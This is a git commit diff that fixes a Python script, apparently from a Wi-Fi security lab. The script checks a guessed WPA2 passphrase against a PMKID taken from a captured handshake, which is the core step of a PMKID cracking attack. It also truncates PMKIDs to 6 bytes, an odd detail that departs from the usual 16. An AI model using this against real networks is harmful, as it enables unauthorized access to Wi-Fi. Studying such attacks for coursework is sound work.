848a5c85a982be2cd1f58ff76de69e9729f8ddb2
Christoph Rueff <christoph.rueff@gmail.com>
2020-05-02 11:43:13 +0200

    Fix script

--- files/pmkid_attack.py
+++ files/pmkid_attack.py
@@ -9,16 +9,19 @@ import hmac, hashlib
 
 packets = rdpcap("PMKID_handshake.pcap")
 
-ssid        = packets[145].info
+ssid        = packets[126].info.decode("utf-8")
 APmac       = a2b_hex(packets[145].addr3.replace(':',''))
 Clientmac   = a2b_hex(packets[145].addr1.replace(':',''))
-pmkid       = "TODO find pmkid"
+pmkid       = a2b_hex("7fd0bc061552217e942d19c6686f1598")[:6]
 
 passPhrase = "admin123"
 
-pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), ssid, 4096, 32)
+pmk = pbkdf2(hashlib.sha1, str.encode(passPhrase), str.encode(ssid), 4096, 32)
 
-computed_pmkid = hmacsha1 = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1)[:6]
+computed_pmkid = hmac.new(pmk,str.encode("PMK Name")+APmac+Clientmac,hashlib.sha1).digest()[:6]
 
-print("real pmkid : ", pmkid)
-print("computed pmkid : ", computed_pmkid)
+print("real pmkid : ", b2a_hex(pmkid))
+print("computed pmkid : ", b2a_hex(computed_pmkid))
+
+if b2a_hex(pmkid) == b2a_hex(computed_pmkid):
+    print("The key was found ! It is : ", passPhrase)
